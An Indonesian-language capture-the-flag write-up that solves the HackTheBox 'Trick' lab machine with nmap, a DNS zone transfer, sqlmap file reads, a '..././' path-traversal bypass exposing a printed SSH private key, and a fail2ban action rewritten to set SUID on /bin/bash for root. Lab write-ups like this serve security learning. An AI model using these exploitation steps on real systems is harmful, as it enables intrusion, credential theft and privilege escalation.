---
title: "HackTheBox - Trick Writeups"
date: 2022-08-22 13:00:00 +07:00
categories: [WriteUps]
tags: [ctf, hackthebox, pentest, writeups]
image: 
---

# HackTheBox - Trick Writeups

#### Kita mulai dengan mengamati port yang terbuka dengan nmap

```terminal
❯ nmap -sC -sV 10.10.11.166                                     
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-21 22:21 PDT
Nmap scan report for trick.htb (10.10.11.166)
Host is up (0.043s latency).
Not shown: 996 closed tcp ports (reset)
PORT   STATE    SERVICE VERSION
22/tcp filtered ssh
25/tcp open     smtp    Postfix smtpd
|_smtp-commands: debian.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
53/tcp open     domain  ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)
| dns-nsid: 
|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian
80/tcp open     http    nginx 1.14.2
|_http-title: Coming Soon - Start Bootstrap Theme
|_http-server-header: nginx/1.14.2
Service Info: Host:  debian.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 52.23 seconds
```
#### Karena tidak ada yang benar-benar menarik di web dan port 53 terbuka, kita dapat menggunakan dig dan mendapatkan host melalui serangan axfr

```terminal
❯ dig trick.htb axfr @10.10.11.166 

; <<>> DiG 9.18.1-1-Debian <<>> trick.htb axfr @10.10.11.166
;; global options: +cmd
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
trick.htb.              604800  IN      NS      trick.htb.
trick.htb.              604800  IN      A       127.0.0.1
trick.htb.              604800  IN      AAAA    ::1
preprod-payroll.trick.htb. 604800 IN    CNAME   trick.htb.
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
;; Query time: 31 msec
;; SERVER: 10.10.11.166#53(10.10.11.166) (TCP)
;; WHEN: Sun Aug 21 22:25:07 PDT 2022
;; XFR size: 6 records (messages 1, bytes 231)
```

#### Setelah menambahkan host, kami pergi ke domain dan menemukan login
![Form Login](https://media.discordapp.net/attachments/740245586095112242/1011144342162898994/unknown.png "Form Login")

#### Kita bisa bermain dengan sqlmap dan setelah beberapa saat kita melihat bahwa kita bisa mendapatkan file dari mesin

```terminal
❯ sqlmap --url "preprod-payroll.trick.htb/ajax.php?action=login" --data "username=test&password=test" --file-read "/etc/hostname" --batch
<------------------------------------------------------------------------------------------------>
[INFO] retrieved: 6
[INFO] the local file '~/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_hostname' and the remote file '/etc/hostname' have the same size (6 B)
files saved to [1]:
<------------------------------------------------------------------------------------------------>
❯ cat ~/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_hostname
trick
```

#### Karena kami tidak menemukan apa pun, kami akan mencari lebih banyak domain, untuk ini kami membuat kamus yang dimulai dengan "preprod-" dan menerapkan brute force

```terminal
❯ sed 's/^/preprod-/' /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt > dictionary
❯ wfuzz -c -w ./dictionary -H "Host: FUZZ.trick.htb" -u 10.10.11.166 -t 100 --hl 83
Target: http://10.10.11.166/
Total requests: 4990

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000255:   200        178 L    631 W      9660 Ch     "preprod-marketing"
```

#### Sekarang di domain "preprod-marketing.trick.htb" kami menemukan beberapa bagian

![Menu Bar](https://media.discordapp.net/attachments/740245586095112242/1011146592138567720/unknown.png "Menu Bar")

#### Kami mengklik satu dan melihat bahwa itu dikelola dengan parameter "page="

![Parameter Page](https://media.discordapp.net/attachments/740245586095112242/1011147010784637039/unknown.png "Parameter Page")

#### Kita bisa memikirkan lfi tetapi memiliki perlindungan, dengan sqlmap kita dapat membaca index.php

```terminal
❯ sqlmap --url "preprod-payroll.trick.htb/ajax.php?action=login" --data "username=test&password=test" --file-read "/var/www/market/index.php" --batch
<--------------------------------------------------------------------------------------------------->
[INFO] retrieved: 194
[INFO] the remote file '/var/www/market/index.php' is larger (194 B) than the local file '~/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_var_www_market_index.php' (193B)
files saved to [1]:
<--------------------------------------------------------------------------------------------------->
❯ cat ~/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_var_www_market_index.php
<?php
$file = $_GET['page'];

if(!isset($file) || ($file=="index.php")) {
   include("/var/www/market/home.html");
}
else{
        include("/var/www/market/".str_replace("../","",$file));
}
?>
```

#### Kami menemukan bahwa jika menemukan "../" itu menghapusnya, tetapi perlindungan ini dapat dengan mudah dilewati, ada contoh di [repositori](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal)

```terminal
❯ curl "preprod-marketing.trick.htb/index.php?page=..././..././..././etc/passwd" | grep bash
root:x:0:0:root:/root:/bin/bash
michael:x:1001:1001::/home/michael:/bin/bash
```

#### Kami melihat bahwa pengguna michael ada, kami dapat melihat apakah dia memiliki id_rsa

```terminal
❯ curl "preprod-marketing.trick.htb/index.php?page=..././..././..././home/michael/.ssh/id_rsa"
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAwI9YLFRKT6JFTSqPt2/+7mgg5HpSwzHZwu95Nqh1Gu4+9P+ohLtz
c4jtky6wYGzlxKHg/Q5ehozs9TgNWPVKh+j92WdCNPvdzaQqYKxw4Fwd3K7F4JsnZaJk2G
YQ2re/gTrNElMAqURSCVydx/UvGCNT9dwQ4zna4sxIZF4HpwRt1T74wioqIX3EAYCCZcf+
4gAYBhUQTYeJlYpDVfbbRH2yD73x7NcICp5iIYrdS455nARJtPHYkO9eobmyamyNDgAia/
Ukn75SroKGUMdiJHnd+m1jW5mGotQRxkATWMY5qFOiKglnws/jgdxpDV9K3iDTPWXFwtK4
1kC+t4a8sQAAA8hzFJk2cxSZNgAAAAdzc2gtcnNhAAABAQDAj1gsVEpPokVNKo+3b/7uaC
DkelLDMdnC73k2qHUa7j70/6iEu3NziO2TLrBgbOXEoeD9Dl6GjOz1OA1Y9UqH6P3ZZ0I0
+93NpCpgrHDgXB3crsXgmydlomTYZhDat7+BOs0SUwCpRFIJXJ3H9S8YI1P13BDjOdrizE
hkXgenBG3VPvjCKiohfcQBgIJlx/7iABgGFRBNh4mVikNV9ttEfbIPvfHs1wgKnmIhit1L
jnmcBEm08diQ716hubJqbI0OACJr9SSfvlKugoZQx2Iked36bWNbmYai1BHGQBNYxjmoU6
IqCWfCz+OB3GkNX0reINM9ZcXC0rjWQL63hryxAAAAAwEAAQAAAQASAVVNT9Ri/dldDc3C
aUZ9JF9u/cEfX1ntUFcVNUs96WkZn44yWxTAiN0uFf+IBKa3bCuNffp4ulSt2T/mQYlmi/
KwkWcvbR2gTOlpgLZNRE/GgtEd32QfrL+hPGn3CZdujgD+5aP6L9k75t0aBWMR7ru7EYjC
tnYxHsjmGaS9iRLpo79lwmIDHpu2fSdVpphAmsaYtVFPSwf01VlEZvIEWAEY6qv7r455Ge
U+38O714987fRe4+jcfSpCTFB0fQkNArHCKiHRjYFCWVCBWuYkVlGYXLVlUcYVezS+ouM0
fHbE5GMyJf6+/8P06MbAdZ1+5nWRmdtLOFKF1rpHh43BAAAAgQDJ6xWCdmx5DGsHmkhG1V
PH+7+Oono2E7cgBv7GIqpdxRsozETjqzDlMYGnhk9oCG8v8oiXUVlM0e4jUOmnqaCvdDTS
3AZ4FVonhCl5DFVPEz4UdlKgHS0LZoJuz4yq2YEt5DcSixuS+Nr3aFUTl3SxOxD7T4tKXA
fvjlQQh81veQAAAIEA6UE9xt6D4YXwFmjKo+5KQpasJquMVrLcxKyAlNpLNxYN8LzGS0sT
AuNHUSgX/tcNxg1yYHeHTu868/LUTe8l3Sb268YaOnxEbmkPQbBscDerqEAPOvwHD9rrgn
In16n3kMFSFaU2bCkzaLGQ+hoD5QJXeVMt6a/5ztUWQZCJXkcAAACBANNWO6MfEDxYr9DP
JkCbANS5fRVNVi0Lx+BSFyEKs2ThJqvlhnxBs43QxBX0j4BkqFUfuJ/YzySvfVNPtSb0XN
jsj51hLkyTIOBEVxNjDcPWOj5470u21X8qx2F3M4+YGGH+mka7P+VVfvJDZa67XNHzrxi+
IJhaN0D5bVMdjjFHAAAADW1pY2hhZWxAdHJpY2sBAgMEBQ==
-----END OPENSSH PRIVATE KEY-----
```

#### Kami mendapatkan kunci resmi, kami dapat terhubung dan mendapatkan pengguna

```terminal
❯ ssh michael@10.10.11.166 -i id_rsa
michael@trick:~$ ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  user.txt  Videos
michael@trick:~$ cat user.txt
4*************************8
michael@trick:~$ 
```

#### Kami memiliki hak istimewa untuk memulai kembali layanan fail2ban sebagai root tanpa kata sandi

```terminal
michael@trick:~$ sudo -l
Matching Defaults entries for michael on trick:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User michael may run the following commands on trick:
    (root) NOPASSWD: /etc/init.d/fail2ban restart
michael@trick:~$
```

#### Kami menemukan file konfigurasi fail2ban

```terminal
michael@trick:/etc/fail2ban/action.d$ cat iptables-multiport.conf
# Fail2Ban configuration file
#
# Author: Cyril Jaquier
# Modified by Yaroslav Halchenko for multiport banning
#

[INCLUDES]

before = iptables-common.conf

[Definition]

# Option:  actionstart
# Notes.:  command executed once at the start of Fail2Ban.
# Values:  CMD
#
actionstart = <iptables> -N f2b-<name>
              <iptables> -A f2b-<name> -j <returntype>
              <iptables> -I <chain> -p <protocol> -m multiport --dports <port> -j f2b-<name>

# Option:  actionstop
# Notes.:  command executed once at the end of Fail2Ban
# Values:  CMD
#
actionstop = <iptables> -D <chain> -p <protocol> -m multiport --dports <port> -j f2b-<name>
             <actionflush>
             <iptables> -X f2b-<name>

# Option:  actioncheck
# Notes.:  command executed once before each actionban command
# Values:  CMD
#
actioncheck = <iptables> -n -L <chain> | grep -q 'f2b-<name>[ \t]'

# Option:  actionban
# Notes.:  command executed when banning an IP. Take care that the
#          command is executed with Fail2Ban user rights.
# Tags:    See jail.conf(5) man page
# Values:  CMD
#
actionban = <iptables> -I f2b-<name> 1 -s <ip> -j <blocktype>

# Option:  actionunban
# Notes.:  command executed when unbanning an IP. Take care that the
#          command is executed with Fail2Ban user rights.
# Tags:    See jail.conf(5) man page
# Values:  CMD
#
actionunban = <iptables> -D f2b-<name> -s <ip> -j <blocktype>

[Init]
```

#### Kita bisa memodifikasi actionban, kita tidak bisa memodifikasinya tapi kita bisa menghapusnya dan membuat yang baru jadi kita akan melakukan hal berikut untuk memodifikasi "actionban"

```terminal
michael@trick:~$ sed "s/<iptables> -I f2b-<name> 1 -s <ip> -j <blocktype>/chmod u+s \/bin\/bash/g" /etc/fail2ban/action.d/iptables-multiport.conf > config.conf
michael@trick:~$ rm -f /etc/fail2ban/action.d/iptables-multiport.conf
michael@trick:~$ mv config.conf /etc/fail2ban/action.d/iptables-multiport.conf
michael@trick:~$
```

#### Kami akan memulai kembali layanan dan menerapkan kekerasan dengan hydra untuk memaksa larangan
```terminal
michael@trick:~$ sudo /etc/init.d/fail2ban restart
[ ok ] Restarting fail2ban (via systemctl): fail2ban.service.
michael@trick:~$
```
```terminal
❯ hydra 10.10.11.166 ssh -l root -P /usr/share/wordlists/rockyou.txt
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-08-21 22:51:05
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.11.166:22/
```
#### Setelah 75 hingga 100 detik bash akan menjadi suid dan kita menjadi root

```terminal
michael@trick:~$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash
michael@trick:~$ bash -p
bash-5.0# whoami
root
bash-5.0# ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  user.txt  Videos
bash-5.0# cd /
bash-5.0# ls
bin   etc         initrd.img.old  lib64       media  proc  sbin  tmp  vmlinuz
boot  home        lib             libx32      mnt    root  srv   usr  vmlinuz.old
dev   initrd.img  lib32           lost+found  opt    run   sys   var
bash-5.0# cd root
bash-5.0# ls
f2b.sh  fail2ban  root.txt  set_dns.sh
bash-5.0# cat root.txt
7*************************4
bash-5.0#
```

![Achivments](https://media.discordapp.net/attachments/740245586095112242/1011152624709550153/unknown.png?width=635&height=580 "Achivments")
